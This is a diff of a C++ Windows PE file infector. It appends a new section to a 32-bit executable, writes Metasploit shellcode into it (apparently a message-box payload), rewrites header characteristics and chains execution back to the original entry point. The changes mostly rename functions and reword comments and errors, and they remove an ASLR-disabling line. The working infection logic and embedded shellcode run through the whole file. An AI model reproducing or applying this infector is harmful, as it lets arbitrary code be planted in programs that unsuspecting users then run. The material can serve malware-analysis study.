@@ -45,7 +45,7 @@ bool AddSection(HANDLE& hFile, PIMAGE_NT_HEADERS& pNtHeader, BYTE* pByte, DWORD&
     CopyMemory(&pSectionHeader[sectionCount].Name, sectionName, 8); //add section name to header of the last section
     // Using 8 bytes for section name,cause it is the maximum allowed section name size
 
-    // Insert all the required information about our new PE section
+    // Fill information of the new section
     pSectionHeader[sectionCount].Misc.VirtualSize = align(sizeOfSection, pNtHeader->OptionalHeader.SectionAlignment, 0);
     pSectionHeader[sectionCount].VirtualAddress = align(pSectionHeader[sectionCount - 1].Misc.VirtualSize, pNtHeader->OptionalHeader.SectionAlignment, pSectionHeader[sectionCount - 1].VirtualAddress);
     pSectionHeader[sectionCount].SizeOfRawData = align(sizeOfSection, pNtHeader->OptionalHeader.FileAlignment, 0);
@@ -64,25 +64,29 @@ bool AddSection(HANDLE& hFile, PIMAGE_NT_HEADERS& pNtHeader, BYTE* pByte, DWORD&
     // Set the file pointer to the end of the last section 
     SetFilePointer(hFile, pSectionHeader[sectionCount].PointerToRawData + pSectionHeader[sectionCount].SizeOfRawData, NULL, FILE_BEGIN);
     SetEndOfFile(hFile);
-    // Change the size of the image,to correspond to modifications
-    // Adding a new section,the image size is bigger 
+    // set new size of image and number of sections
     pNtHeader->OptionalHeader.SizeOfImage = pSectionHeader[sectionCount].VirtualAddress + pSectionHeader[sectionCount].Misc.VirtualSize;
-    // After adding a new section, change the number of section
     pNtHeader->FileHeader.NumberOfSections += 1;
-    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
     // Adding all the modifications to the file
+    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
     WriteFile(hFile, pByte, fileSize, &bytesWritten, NULL);
-    // CloseHandle(hFile);
     return true;
 }
 
-bool InflectSection(HANDLE& hFile, PIMAGE_NT_HEADERS& pNtHeader, BYTE* pByte, DWORD& fileSize, DWORD& byteWritten) {
-    // Disable ASLR
-    pNtHeader->OptionalHeader.DllCharacteristics &= ~IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE;
+bool AddCode(HANDLE& hFile, PIMAGE_NT_HEADERS& pNtHeader, BYTE* pByte, DWORD& fileSize, DWORD& byteWritten) {
 
-    // Modify to make below shellcode work correctly
     pNtHeader->FileHeader.Characteristics = 0x010F;
-
+    /*
+    0x010F = IMAGE_FILE_EXECUTABLE_IMAGE |
+            IMAGE_FILE_LINE_NUMS_STRIPPED |
+            IMAGE_FILE_LOCAL_SYMS_STRIPPED |
+            IMAGE_FILE_32BIT_MACHINE |
+            IMAGE_FILE_DEBUG_STRIPPED |
+            IMAGE_FILE_REMOVABLE_RUN_FROM_SWAP |
+            IMAGE_FILE_NET_RUN_FROM_SWAP |
+            IMAGE_FILE_SYSTEM |
+            IMAGE_FILE_DLL
+    */
     // Insert code into last section
     PIMAGE_SECTION_HEADER firstSection = IMAGE_FIRST_SECTION(pNtHeader);
     PIMAGE_SECTION_HEADER lastSection = firstSection + (pNtHeader->FileHeader.NumberOfSections - 1);
@@ -94,7 +98,7 @@ bool InflectSection(HANDLE& hFile, PIMAGE_NT_HEADERS& pNtHeader, BYTE* pByte, DW
     WriteFile(hFile, pByte, fileSize, &byteWritten, NULL);
     SetFilePointer(hFile, lastSection->PointerToRawData, NULL, FILE_BEGIN);
 
-    // Get shellcode from Metasploit framework
+    // Shellcode from metasploit
     const char* shellcode1 = "\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9\x64"
                                 "\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08\x8b\x7e"
                                 "\x20\x8b\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1\xff\xe1\x60"
@@ -127,7 +131,8 @@ bool InflectSection(HANDLE& hFile, PIMAGE_NT_HEADERS& pNtHeader, BYTE* pByte, DW
         BYTE carrier = (BYTE)(lastEntryPoint >> (i * 8));
         WriteFile(hFile, &carrier, 1, &byteWritten, NULL);
     }
-    // Add \xc3 to the end of shellcode, it makes shellcode run correctly
+    // Add \xc3 to the end of shellcode
+    // \xc3 is ret instruction 
     const char* shellcode2 = "\xc3";
     WriteFile(hFile, shellcode2, 1, &byteWritten, NULL);
     if (byteWritten != 1) {
@@ -152,7 +157,7 @@ bool OpenFile(const char* fileName) {
         cerr << "Error: File " << fileName << " empty, try another one" << endl;
         return false;
     }
-    // Buffer to allocate
+    // allocate the buffer for size of file
     BYTE* pByte = new BYTE[fileSize];
     DWORD byteWritten;
 
@@ -171,22 +176,22 @@ bool OpenFile(const char* fileName) {
     PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)(pByte + pDosHeader->e_lfanew);
     if (pNtHeader->FileHeader.Machine != IMAGE_FILE_MACHINE_I386) {
         CloseHandle(hFile);
-        cerr << "Error: " << fileName << " is PE32+, this version works only with PE32" << endl;
+        cerr << "Please input path to file PE32" << endl;
         return false;
     }
 
     if (!AddSection(hFile, pNtHeader, pByte, fileSize, byteWritten, 400)) {
-        cerr << "Error: Fail to create new section into " << fileName << endl;
+        cerr << "Error: Fail to create new section" << endl;
         return false;
     }
 
-    // Insert data into the last section
-    if (!InflectSection(hFile, pNtHeader, pByte, fileSize, byteWritten)) {
-        cerr << "Error: Fail to infect Message Box into " << fileName << endl;
+    // Add code to new section and change entry point
+    if (!AddCode(hFile, pNtHeader, pByte, fileSize, byteWritten)) {
+        cerr << "Fail to infect code" << endl;
         return false;
     }
 
-    cerr << "Success to infect Message Box into " << fileName << endl;
+    cerr << "Success to infect Message Box into " << endl;
 
     CloseHandle(hFile);
     return true;
